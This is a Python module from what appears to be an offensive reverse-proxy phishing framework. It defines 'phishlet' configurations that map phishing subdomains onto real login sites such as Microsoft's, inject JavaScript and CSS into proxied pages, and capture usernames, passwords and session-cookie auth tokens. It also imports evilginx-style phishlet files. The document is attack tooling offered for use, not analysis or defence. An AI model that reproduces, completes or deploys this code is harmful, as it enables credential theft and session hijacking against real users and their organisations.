"""
Vantablack Core v5 - Phishlets (Phishflow 2.0)
==============================================

Handles:
- Loading phishing scenarios (YAML definitions)
- Subdomain mapping (e.g., login.microsoft.com -> login.phish.com)
- Injection rules (JS/CSS overrides)
- Credential capture patterns
"""

import yaml
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from pydantic import BaseModel

class SubdomainMap(BaseModel):
    subdomain: str
    target: str

class CaptureRule(BaseModel):
    type: str  # "cookie", "post_param", "header"
    name: str
    regex: Optional[str] = None

class InjectionRule(BaseModel):
    trigger_path: str
    content: str
    position: str = "body_end"  # head_end, body_start, body_end

class HeaderRule(BaseModel):
    action: str  # "set" | "remove"
    name: str
    value: Optional[str] = None

class PathRewriteRule(BaseModel):
    pattern: str  # regex
    replace: str
    methods: List[str] = ["GET", "POST"]

class CookieRewriteRule(BaseModel):
    name: str
    domain_to: Optional[str] = None
    path_to: Optional[str] = None
    samesite: Optional[str] = None
    secure: Optional[bool] = None
    
class FormActionRule(BaseModel):
    selector: str
    action_to: str

class ResourceBlockRule(BaseModel):
    pattern: str
    mimes: List[str] = []
    max_kb: Optional[int] = None

class BridgeRule(BaseModel):
    prefix: str
    target_host: str
    strip_prefix: bool = True
    origin_host: Optional[str] = None
    cors: Optional[str] = None  # "mirror" | "allow_all" | None

class PhishletConfig(BaseModel):
    name: str
    author: str
    min_ver: str
    proxy_hosts: List[SubdomainMap]
    auth_urls: List[str]
    landing_path: List[str]
    auth_tokens: List[CaptureRule]
    credentials: List[CaptureRule]
    injections: List[InjectionRule] = []
    headers: List[HeaderRule] = []
    path_rewrites: List[PathRewriteRule] = []
    cookie_rewrites: List[CookieRewriteRule] = []
    blocklist: List[ResourceBlockRule] = []
    form_actions: List[FormActionRule] = []
    bridges: List[BridgeRule] = []

class PhishletLoader:
    def __init__(self):
        self.logger = logging.getLogger("vantablack.edge.phishlets")

    def load_from_yaml(self, yaml_content: str) -> PhishletConfig:
        """Parse YAML content into a PhishletConfig object"""
        try:
            data = yaml.safe_load(yaml_content)
            # New schema fast-path
            if isinstance(data, dict) and "name" in data and "proxy_hosts" in data:
                cfg = PhishletConfig(**data)
                try:
                    from core.common.metrics import PHISHLET_LOAD
                    PHISHLET_LOAD.inc()
                except Exception:
                    pass
                return cfg
            # Legacy (evilginx-like) schema conversion
            conv = self._convert_legacy_schema(data)
            cfg = PhishletConfig(**conv)
            try:
                from core.common.metrics import PHISHLET_LOAD
                PHISHLET_LOAD.inc()
            except Exception:
                pass
            return cfg
        except Exception as e:
            self.logger.error(f"Failed to load phishlet: {str(e)}")
            raise

    def get_target_host(self, phishlet: PhishletConfig, request_host: str) -> Optional[str]:
        """
        Map incoming request host (phishing domain) to target host (legit domain).
        Example: login.phish.com -> login.microsoftonline.com
        """
        # This requires knowing the base phishing domain, which is context-dependent.
        # For now, we assume strict mapping based on subdomain prefix.
        # Implementation to be refined with runtime context.
        return None

    def _convert_legacy_schema(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Convert common evilginx-phishlet-like structures to Phishflow 2.x
        """
        name = data.get("name") or "Legacy-Imported"
        author = data.get("author") or "Legacy"
        min_ver = str(data.get("min_ver", "5.0.0"))
        proxy_hosts = []
        for entry in data.get("proxy_hosts", []):
            phish_sub = entry.get("phish_sub") or entry.get("subdomain") or entry.get("orig_sub") or "www"
            domain = entry.get("domain")
            orig_sub = entry.get("orig_sub") or phish_sub
            if domain:
                target = f"{orig_sub}.{domain}"
            else:
                target = orig_sub
            proxy_hosts.append({"subdomain": phish_sub, "target": target})
        # Credentials
        credentials: List[Dict[str, Any]] = []
        cred = data.get("credentials", {})
        for key in ["username", "password"]:
            if key in cred and isinstance(cred[key], dict) and "key" in cred[key]:
                credentials.append({"type": "post_param", "name": cred[key]["key"]})
        # Auth tokens
        auth_tokens: List[Dict[str, Any]] = []
        for tok in data.get("auth_tokens", []):
            for k in tok.get("keys", []):
                auth_tokens.append({"type": "cookie", "name": k})
        # Landing paths
        landing = []
        login = data.get("login", {})
        if isinstance(login, dict) and "path" in login:
            landing.append(login["path"])
        # Fallbacks
        config = {
            "name": name,
            "author": author,
            "min_ver": min_ver,
            "proxy_hosts": proxy_hosts or [{"subdomain": "www", "target": "example.com"}],
            "auth_urls": data.get("auth_urls", []),
            "landing_path": landing or ["/"],
            "auth_tokens": auth_tokens,
            "credentials": credentials,
            "injections": [],
            "headers": [],
            "path_rewrites": [],
            "cookie_rewrites": [],
            "blocklist": [],
        }
        return config
